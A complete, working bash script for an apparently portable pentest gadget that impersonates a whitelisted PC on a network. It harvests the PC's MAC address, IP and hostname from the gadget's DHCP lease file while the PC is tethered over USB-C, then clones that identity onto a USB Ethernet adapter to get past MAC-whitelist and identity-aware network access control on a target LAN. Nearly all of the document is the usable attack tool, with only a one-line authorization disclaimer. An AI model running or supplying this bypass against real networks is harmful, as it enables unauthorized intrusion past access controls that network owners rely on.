#!/bin/bash
# usbclone.sh - USB-C device clone / whitelist bypass (approved idea U1).
#
# THE IDEA (user's words): a target PC is whitelisted on a LAN (its NIC MAC is
# allowed; yours isn't). Plug the Pager into that PC over USB-C - the Pager is
# a USB-Ethernet gadget, so the PC treats it as a wired NIC and DHCPs against
# the Pager (which is br-lan's DHCP server). That handshake leaks the PC's
# identity (MAC, hostname, IP) straight into the Pager's own lease file. Clone
# that identity onto the Pager's LAN-facing adapter (eth1, the USB-A adapter),
# unplug from the PC, plug the Pager into the target LAN - now it presents the
# whitelisted identity and gets access.
#
# FLOW:
#   1) usbclone.sh --capture      (Pager plugged into the PC via USB-C)
#   2) usbclone.sh --clone        (apply the captured MAC+hostname to eth1)
#   3) plug eth1 (USB-A adapter) into the target LAN - it DHCPs as the PC
#   4) usbclone.sh --restore      (put eth1's real MAC back when done)
#
# Interfaces: eth0 = USB-C gadget (the PC tethers here, appears in
# /tmp/dhcp.leases on br-lan); eth1 = USB-A Ethernet adapter (what plugs into
# the target LAN). Every `ip link` goes through common.sh's timeout-guarded
# ip_link() - a raw netlink call here can wedge and take SSH-over-USB-C down
# with it (documented live incident).
#
# Usage:
#   usbclone.sh --capture [--iface eth1]   read the tethered PC's identity
#   usbclone.sh --show                     print the captured identity
#   usbclone.sh --clone   [--iface eth1]   apply MAC(+hostname) to the LAN iface
#   usbclone.sh --restore [--iface eth1]   revert the LAN iface to its real MAC
#   usbclone.sh --status
#
# Only on networks/devices you are authorized to use.

set -u
TOOL_NAME="usbclone.sh"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
. "$SCRIPT_DIR/lib/common.sh"

LOOT_DIR="/root/loot/usbclone"
IDFILE="$LOOT_DIR/identity.env"      # captured target identity
ORIGFILE="$LOOT_DIR/orig-mac.env"    # our real MAC, saved before a clone
LEASES="/tmp/dhcp.leases"

usage() { sed -n '2,30p' "$0" | sed 's/^# \{0,1\}//'; exit 1; }

MODE=""; IFACE="eth1"
filter_yes_args "$@"; set -- "${FILTERED_ARGS[@]}"
while [ $# -gt 0 ]; do
    case "$1" in
        --capture) MODE="capture"; shift ;;
        --show)    MODE="show"; shift ;;
        --clone)   MODE="clone"; shift ;;
        --restore) MODE="restore"; shift ;;
        --status)  MODE="status"; shift ;;
        --iface)   IFACE="${2:-eth1}"; shift 2 ;;
        -h|--help) usage ;;
        --) shift ;;
        *) die "Unknown argument: $1 (see --help)" ;;
    esac
done
[ -n "$MODE" ] || usage
mkdir -p "$LOOT_DIR" 2>/dev/null

valid_mac() { echo "$1" | grep -qiE '^([0-9a-f]{2}:){5}[0-9a-f]{2}$'; }

do_capture() {
    iface_has_carrier eth0 || die "Nothing on USB-C (eth0). Plug the Pager into the target PC first."
    [ -f "$LEASES" ] || die "No DHCP lease file ($LEASES) - the PC hasn't pulled an address from the Pager yet. Give it ~15s."
    # dnsmasq lease line: <expiry> <mac> <ip> <hostname> <clientid>
    local line mac ip host
    line=$(sort -rn "$LEASES" 2>/dev/null | head -1)
    [ -n "$line" ] || die "Lease file is empty - no tethered device seen yet."
    mac=$(echo "$line" | awk '{print $2}')
    ip=$(echo "$line" | awk '{print $3}')
    host=$(echo "$line" | awk '{print $4}')
    valid_mac "$mac" || die "Could not read a valid MAC from the lease ($mac)."
    [ "$host" = "*" ] && host=""
    {
        echo "TARGET_MAC=$mac"
        echo "TARGET_IP=$ip"
        echo "TARGET_HOST=$host"
    } > "$IDFILE"
    say "Captured target identity from the tethered PC:"
    say "  MAC=$mac  IP=$ip  hostname=${host:-<none>}"
    say "Now: usbclone.sh --clone   (then plug eth1 into the target LAN)."
}

do_show() {
    [ -f "$IDFILE" ] || die "No captured identity yet - run --capture first."
    cat "$IDFILE"
}

do_clone() {
    [ -f "$IDFILE" ] || die "No captured identity - run --capture first."
    [ -e "/sys/class/net/$IFACE" ] || die "Interface $IFACE not present (plug in the USB-A adapter)."
    . "$IDFILE"
    valid_mac "${TARGET_MAC:-}" || die "Stored identity has no valid MAC - re-run --capture."
    # Save our real MAC once, so --restore can always get back.
    if [ ! -f "$ORIGFILE" ]; then
        local realmac; realmac=$(cat "/sys/class/net/$IFACE/address" 2>/dev/null)
        echo "ORIG_MAC=$realmac" > "$ORIGFILE"
        echo "ORIG_IFACE=$IFACE" >> "$ORIGFILE"
    fi
    say "Cloning $TARGET_MAC onto $IFACE..."
    ip_link set "$IFACE" down || die "Could not bring $IFACE down."
    ip_link set "$IFACE" address "$TARGET_MAC" || { ip_link set "$IFACE" up; die "Setting MAC failed (adapter may not allow it)."; }
    ip_link set "$IFACE" up || die "Could not bring $IFACE up."
    # DHCP onto the target LAN as the cloned device, sending the cloned
    # hostname so an identity-aware NAC sees the same name too.
    if command -v udhcpc >/dev/null 2>&1; then
        if [ -n "${TARGET_HOST:-}" ]; then
            udhcpc -i "$IFACE" -n -q -t 5 -x "hostname:$TARGET_HOST" >/dev/null 2>&1 \
                && say "Got a lease on $IFACE as $TARGET_MAC (hostname $TARGET_HOST)." \
                || say "MAC cloned, but no DHCP lease yet - is $IFACE plugged into the target LAN?"
        else
            udhcpc -i "$IFACE" -n -q -t 5 >/dev/null 2>&1 \
                && say "Got a lease on $IFACE as $TARGET_MAC." \
                || say "MAC cloned, but no DHCP lease yet - is $IFACE plugged into the target LAN?"
        fi
    else
        say "MAC cloned onto $IFACE. (udhcpc not found - request an address with your usual DHCP client.)"
    fi
    say "Clone active. Run --restore when finished."
}

do_restore() {
    [ -f "$ORIGFILE" ] || die "No saved original MAC - nothing to restore (were we ever cloned?)."
    . "$ORIGFILE"
    local ifc="${ORIG_IFACE:-$IFACE}"
    valid_mac "${ORIG_MAC:-}" || die "Saved original MAC is invalid - set it by hand if needed."
    say "Restoring $ifc to its real MAC $ORIG_MAC..."
    ip_link set "$ifc" down || die "Could not bring $ifc down."
    ip_link set "$ifc" address "$ORIG_MAC" || { ip_link set "$ifc" up; die "Restoring MAC failed."; }
    ip_link set "$ifc" up || die "Could not bring $ifc up."
    command -v udhcpc >/dev/null 2>&1 && udhcpc -i "$ifc" -n -q -t 5 >/dev/null 2>&1
    rm -f "$ORIGFILE"
    say "Restored. $ifc is back to $ORIG_MAC."
}

do_status() {
    if [ -f "$IDFILE" ]; then say "Captured identity:"; sed 's/^/  /' "$IDFILE"; else say "No captured identity."; fi
    if [ -f "$ORIGFILE" ]; then say "Clone ACTIVE (real MAC saved - use --restore)."; else say "No active clone."; fi
    for i in eth0 "$IFACE"; do
        [ -e "/sys/class/net/$i" ] && say "  $i MAC now: $(cat /sys/class/net/$i/address 2>/dev/null)"
    done
}

case "$MODE" in
    capture) do_capture ;;
    show)    do_show ;;
    clone)   do_clone ;;
    restore) do_restore ;;
    status)  do_status ;;
esac
